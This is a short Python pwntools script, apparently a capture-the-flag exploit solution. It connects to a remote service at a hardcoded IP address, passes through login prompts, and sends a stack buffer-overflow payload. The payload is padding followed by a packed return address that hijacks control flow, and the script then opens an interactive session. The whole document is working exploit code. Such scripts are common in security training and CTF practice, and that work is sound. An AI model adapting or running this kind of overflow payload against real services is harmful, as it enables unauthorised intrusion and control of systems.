from pwn import *

p = remote("111.198.29.45", 31634)

p.recvuntil("Your choice:")
p.sendline("1")
p.recvuntil("Please input your username:")
p.sendline("1")
p.recvuntil("Please input your passwd:")

payload = "A" * 24 + p32(0x804868b) + 'B' * 232
p.sendline(payload)

p.interactive()
